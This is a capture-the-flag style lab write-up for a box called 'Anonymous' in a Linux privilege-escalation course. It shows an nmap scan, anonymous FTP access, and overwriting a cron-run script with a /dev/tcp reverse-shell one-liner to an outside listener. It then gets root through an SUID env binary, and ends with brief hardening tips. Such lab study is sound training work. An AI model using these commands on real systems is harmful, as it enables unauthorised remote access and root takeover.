# 🛡️ Anonymous

> **Course Track:** [Linux Privilege Escalation](../../README.md)  
> **Module:** [Capstone](./README.md)  
> **Topic Path:** `Linux Privilege Escalation > Capstone > Anonymous`

---

## 🎯 Technical Overview & Objectives
This section covers the methodology, enumeration techniques, exploit mechanics, and defensive mitigations for **Anonymous**.

---

## 🔬 Practical Notes, Commands & Proof of Exploit

did nmap scan

```bash
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.9.237
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 5 hops
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-04-17T11:23:01
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2025-04-17T11:23:01+00:00

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   17.12 ms  10.17.0.1
2   ... 4
5   141.42 ms 10.10.46.54

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.16 seconds
```

Found that the ftp port was open to anonymous login

ftp ipaddress

switched to passive with epsv
Ran binary since it is better for file transfer

```bash
binary
```

To get all the files 

```bash
mget *
```
It will ask you if you wnt to get each file one after the other (just type yes)

the [clean.sh](http://clean.sh/) file seemed like an execuable which was running everymin
So edited that
I put a reverse shell 1 liner in it

```bash
/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1
```

And overwrote the [clean.sh](http://clean.sh/) file on the ftp server by uploading mine

```bash
put clean.sh
```

started an nc listner
Got the shell

Tried sudo -l
Got error no tty shell

Pasted the below code direct

```bash
python -c 'import pty; pty.spawn("/bin/bash")' 
```
And then got a shell

But it was asking for password now when we tried the sudo -l again
So then used the cheetsheet to find suid bits

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```
Got a lot, (recommended to got through everything)
Found env interesting 
So checked it on gtfobins and it was there

used the following to get root

```bash
/usr/bin/env /bin/bash -p
```



---

## 🛡️ Defensive Hardening & Remediation
- **Audit & Restrict Permissions:** Review `/etc/sudoers`, remove unnecessary SUID/SGID flags (`chmod u-s`), and enforce strict file ownership on configuration files.
- **Kernel Patching:** Regularly apply distribution security updates to mitigate known local privilege escalation (LPE) vulnerabilities.
- **Principle of Least Privilege:** Avoid running non-administrative daemon processes as `root` and isolate services using containers/namespaces.

---
[⬅ Back to Capstone](./README.md) • [🏠 Master Course Index](../README.md)
